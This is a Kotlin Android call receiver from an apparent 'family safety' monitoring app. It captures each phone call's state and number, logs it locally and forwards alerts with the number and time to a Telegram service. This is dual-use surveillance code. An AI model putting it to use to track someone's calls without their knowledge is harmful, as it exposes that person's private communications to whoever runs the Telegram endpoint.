package com.family.safety.helper.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import com.family.safety.helper.database.MonitoringDatabase
import com.family.safety.helper.database.NotificationEntity
import com.family.safety.helper.services.TelegramService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class CallReceiver : BroadcastReceiver() {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private var lastState = TelephonyManager.CALL_STATE_IDLE
    
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED == intent.action) {
            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            val phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            
            scope.launch {
                try {
                    val database = MonitoringDatabase.getDatabase(context)
                    val telegramService = TelegramService()
                    telegramService.initialize(context)
                    
                    when (state) {
                        TelephonyManager.EXTRA_STATE_RINGING -> {
                            handleIncomingCall(phoneNumber, database, telegramService)
                        }
                        TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                            if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                                handleCallAnswered(phoneNumber, database, telegramService)
                            } else {
                                handleOutgoingCall(phoneNumber, database, telegramService)
                            }
                        }
                        TelephonyManager.EXTRA_STATE_IDLE -> {
                            if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
                                handleCallEnded(phoneNumber, database, telegramService)
                            }
                        }
                    }
                    
                    lastState = when (state) {
                        TelephonyManager.EXTRA_STATE_RINGING -> TelephonyManager.CALL_STATE_RINGING
                        TelephonyManager.EXTRA_STATE_OFFHOOK -> TelephonyManager.CALL_STATE_OFFHOOK
                        else -> TelephonyManager.CALL_STATE_IDLE
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
    
    private suspend fun handleIncomingCall(
        phoneNumber: String?,
        database: MonitoringDatabase,
        telegramService: TelegramService
    ) {
        val number = phoneNumber ?: "Unknown"
        val timestamp = System.currentTimeMillis()
        
        val notificationEntity = NotificationEntity(
            packageName = "call",
            appName = "Phone",
            title = "Incoming Call",
            text = "From: $number",
            timestamp = timestamp
        )
        
        database.notificationDao().insertNotification(notificationEntity)
        
        val success = telegramService.sendCallAlert(
            type = "Incoming Call",
            phoneNumber = number,
            timestamp = timestamp
        )
        
        if (success) {
            database.notificationDao().markAsSent(notificationEntity.id)
        }
    }
    
    private suspend fun handleCallAnswered(
        phoneNumber: String?,
        database: MonitoringDatabase,
        telegramService: TelegramService
    ) {
        val number = phoneNumber ?: "Unknown"
        val timestamp = System.currentTimeMillis()
        
        val success = telegramService.sendCallAlert(
            type = "Call Answered",
            phoneNumber = number,
            timestamp = timestamp
        )
    }
    
    private suspend fun handleOutgoingCall(
        phoneNumber: String?,
        database: MonitoringDatabase,
        telegramService: TelegramService
    ) {
        val number = phoneNumber ?: "Unknown"
        val timestamp = System.currentTimeMillis()
        
        val notificationEntity = NotificationEntity(
            packageName = "call",
            appName = "Phone",
            title = "Outgoing Call",
            text = "To: $number",
            timestamp = timestamp
        )
        
        database.notificationDao().insertNotification(notificationEntity)
        
        val success = telegramService.sendCallAlert(
            type = "Outgoing Call",
            phoneNumber = number,
            timestamp = timestamp
        )
        
        if (success) {
            database.notificationDao().markAsSent(notificationEntity.id)
        }
    }
    
    private suspend fun handleCallEnded(
        phoneNumber: String?,
        database: MonitoringDatabase,
        telegramService: TelegramService
    ) {
        val number = phoneNumber ?: "Unknown"
        val timestamp = System.currentTimeMillis()
        
        val success = telegramService.sendCallAlert(
            type = "Call Ended",
            phoneNumber = number,
            timestamp = timestamp
        )
    }
}
